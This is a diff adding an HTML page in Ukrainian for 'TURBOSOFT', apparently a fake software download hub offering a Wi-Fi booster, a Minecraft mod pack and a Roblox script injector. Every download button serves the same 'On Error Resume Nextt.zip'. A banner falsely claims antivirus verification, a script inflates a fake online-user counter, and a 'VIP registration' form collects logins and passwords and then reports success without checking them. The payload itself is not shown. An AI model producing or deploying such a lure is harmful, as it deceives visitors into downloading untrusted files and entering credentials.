@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Software Hub v4.0 — TURBOSOFT 2026</title>
+    <style>
+        /* Переменные для тем */
+        :root {
+            --bg-body: #f4f7f6;
+            --bg-card: white;
+            --text-main: #333;
+            --text-sub: #666;
+            --bg-stats: #fff;
+            --shadow: rgba(0,0,0,0.05);
+        }
+
+        [data-theme="dark"] {
+            --bg-body: #121212;
+            --bg-card: #1e1e1e;
+            --text-main: #e0e0e0;
+            --text-sub: #b0b0b0;
+            --bg-stats: #1e1e1e;
+            --shadow: rgba(0,0,0,0.3);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-body);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--text-main);
+            transition: 0.3s;
+        }
+
+        .top-nav {
+            width: 100%;
+            background: #1a1a1a;
+            color: white;
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            border-bottom: 3px solid #0056b3;
+        }
+        .nav-container {
+            width: 840px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 22px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .logo span { color: #0056b3; }
+        
+        .auth-buttons button {
+            background: #0056b3;
+            color: white;
+            border: none;
+            padding: 7px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .btn-theme {
+            background: #444 !important;
+        }
+
+        .stats-bar {
+            background: var(--bg-stats);
+            width: 840px;
+            margin-top: 20px;
+            padding: 10px 0;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-around;
+            box-shadow: 0 2px 5px var(--shadow);
+            font-size: 14px;
+        }
+        .stat-item b { color: #0056b3; }
+
+        header {
+            text-align: center;
+            padding: 30px 0;
+        }
+        h1 { font-size: 32px; margin: 0; color: var(--text-main); }
+        .subtitle { color: var(--text-sub); margin-top: 10px; }
+
+        .banner {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px 20px;
+            border-radius: 8px;
+            width: 800px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #c3e6cb;
+        }
+
+        .main-content {
+            display: flex;
+            gap: 20px;
+            width: 840px;
+        }
+
+        .software-list { flex: 3; }
+
+        .card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px var(--shadow);
+            border-left: 5px solid transparent;
+            transition: 0.3s;
+        }
+        .card:hover { border-left: 5px solid #0056b3; transform: translateX(5px); }
+
+        .card-info h3 { margin: 0; color: #0056b3; font-size: 18px; }
+        .card-info p { margin: 5px 0 0; color: var(--text-sub); font-size: 13px; }
+
+        .btn-download {
+            background-color: #0056b3;
+            color: white;
+            padding: 10px 25px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 14px;
+            transition: 0.2s;
+            cursor: pointer;
+            border: none;
+        }
+        .btn-download:hover { background-color: #004494; box-shadow: 0 0 10px rgba(0,86,179,0.4); }
+
+        .sidebar {
+            flex: 1;
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 2px 5px var(--shadow);
+            height: fit-content;
+        }
+        .atb-header {
+            background-color: #d11111;
+            color: white;
+            text-align: center;
+            padding: 5px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .ad-item { font-size: 13px; margin-bottom: 10px; border-bottom: 1px dashed #ddd; padding-bottom: 5px; }
+        .price { color: #d11111; font-weight: bold; }
+
+        footer { margin-top: 40px; font-size: 11px; color: #999; text-align: center; padding-bottom: 20px; }
+
+        /* Стиль для модального окна регистрации */
+        #regModal {
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.8); 
+            z-index: 2000; 
+            justify-content: center; 
+            align-items: center;
+        }
+        .modal-content {
+            background: var(--bg-card); 
+            padding: 30px; 
+            border-radius: 15px; 
+            width: 300px; 
+            text-align: center; 
+            border: 2px solid #0056b3; 
+            box-shadow: 0 0 20px rgba(0,86,179,0.5);
+        }
+        .modal-content input {
+            width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 5px; 
+            border: 1px solid #444; background: var(--bg-body); color: var(--text-main);
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-nav">
+        <div class="nav-container">
+            <div class="logo">TURBO<span>SOFT</span></div>
+            <div class="auth-buttons">
+                <button class="btn-theme" onclick="toggleTheme()">🌓 Тема</button>
+                <button onclick="alert('Сервер авторизації тимчасово недоступний')">Увійти</button>
+                <button onclick="openReg()">Реєстрація</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats-bar">
+        <div class="stat-item">👥 Користувачів: <b>45,897</b></div>
+        <div class="stat-item">🟢 Онлайн: <b id="online-count">1,402</b></div>
+        <div class="stat-item">💾 Завантажень сьогодні: <b>324</b></div>
+    </div>
+
+    <header>
+        <h1>Software Hub v4.0</h1>
+        <div class="subtitle">Офіційний дистриб'ютор софту від RomaSoft</div>
+    </header>
+
+    <div class="banner">
+        ✅ <b>Безпека підтверджена:</b> Усі файли перевірені антивірусом <b>Microsoft Defender 2026</b>. Жодних загроз не виявлено.
+    </div>
+
+    <div class="main-content">
+        <div class="software-list">
+            
+            <div class="card" style="background: #fff9e6; border-left: 5px solid #f1c40f;">
+                <div class="card-info">
+                    <h3>🚀 Internet Turbo Speed + Wi-Fi Boost</h3>
+                    <p>Ексклюзив: Оптимізація пакетів та розширення каналу Wi-Fi.</p>
+                </div>
+                <a href="On%20Error%20Resume%20Nextt.zip" download class="btn-download js-download" style="background: #f39c12;">Завантажити</a>
+            </div>
+
+            <div class="card">
+                <div class="card-info">
+                    <h3>Minecraft Global Mod Pack</h3>
+                    <p>Оновлення від 02.03.2026. Покращена стабільність.</p>
+                </div>
+                <a href="On%20Error%20Resume%20Nextt.zip" download class="btn-download js-download">Завантажити</a>
+            </div>
+
+            <div class="card">
+                <div class="card-info">
+                    <h3>Roblox Mega Script Injector</h3>
+                    <p>Працює на всіх версіях Windows. Автоматичне оновлення.</p>
+                </div>
+                <a href="On%20Error%20Resume%20Nextt.zip" download class="btn-download js-download">Завантажити</a>
+            </div>
+        </div>
+
+        <div class="sidebar">
+            <div class="atb-header">АТБ-МАРКЕТ</div>
+            <p style="font-size: 11px; color: #999;">РЕКЛАМА</p>
+            <div class="ad-item">Акція "Економія"!<br>Ковбаса "Добров" 400г<br><span class="price">129.90 грн</span></div>
+            <div class="ad-item">Молоко "Яготинське" 2.5%<br><span class="price">34.50 грн</span></div>
+            <div class="ad-item">Напій "Pepsi" 2л<br><span class="price">39.90 грн</span></div>
+        </div>
+    </div>
+
+    <div id="regModal">
+        <div class="modal-content">
+            <h2 style="margin-top:0; color:#0056b3;">VIP Реєстрація</h2>
+            <p style="font-size:12px; color:var(--text-sub);">Створіть VIP аккаунт для TURBOSOFT</p>
+            <input type="text" id="regLogin" placeholder="Логін">
+            <input type="password" id="regPass" placeholder="Пароль">
+            <button onclick="finishReg()" id="regBtn" style="width:100%; background:#0056b3; color:white; border:none; padding:12px; border-radius:5px; font-weight:bold; cursor:pointer;">Активувати VIP</button>
+            <p id="regStatus" style="display:none; color:#28a745; margin-top:15px; font-weight:bold;">✅ Доступ надано!</p>
+            <br>
+            <a href="#" onclick="closeModal()" style="color:#999; font-size:11px; text-decoration:none;">Скасувати</a>
+        </div>
+    </div>
+
+    <footer>
+        © 2026 TURBOSOFT Digital Distro. Всі права захищені.<br>
+        Ліцензія користувача №451-2026-STBL.
+    </footer>
+
+    <script>
+        // Смена темы
+        function toggleTheme() {
+            const body = document.body;
+            if (body.getAttribute('data-theme') === 'dark') {
+                body.removeAttribute('data-theme');
+            } else {
+                body.setAttribute('data-theme', 'dark');
+            }
+        }
+
+        // --- Улучшенный Живой онлайн ---
+        setInterval(() => {
+            const onlineElem = document.getElementById('online-count');
+            let currentOnline = parseInt(onlineElem.innerText.replace(',', ''));
+            
+            // Логика: чаще растет (+2, +3), реже падает (-1)
+            // И никогда не падает ниже 1300
+            let change = Math.floor(Math.random() * 5) - 1; // Возможные значения: -1, 0, 1, 2, 3
+            
+            let newOnline = currentOnline + change;
+            
+            if (newOnline < 1300) {
+                newOnline = 1300 + Math.floor(Math.random() * 10); // Возвращаем к 1300+
+            }
+
+            onlineElem.innerText = newOnline.toLocaleString();
+        }, 3000);
+
+        // --- Логика регистрации ---
+        function openReg() {
+            document.getElementById('regModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('regModal').style.display = 'none';
+        }
+
+        function finishReg() {
+            const btn = document.getElementById('regBtn');
+            const login = document.getElementById('regLogin').value;
+            
+            if(!login) { alert('Введіть логін!'); return; }
+
+            btn.innerText = "Перевірка ключа...";
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                document.getElementById('regStatus').style.display = 'block';
+                btn.innerText = "Активовано";
+                btn.style.background = "#28a745";
+                
+                setTimeout(() => {
+                    alert('Вітаємо, ' + login + '! Твій VIP статус активовано.');
+                    closeModal();
+                }, 1500);
+            }, 2000);
+        }
+
+        document.querySelectorAll('.js-download').forEach(button => {
+            button.addEventListener('click', function(e) {
+                console.log("Початок завантаження: " + this.getAttribute('download'));
+            });
+        });
+    </script>
+
+</body>
+</html>
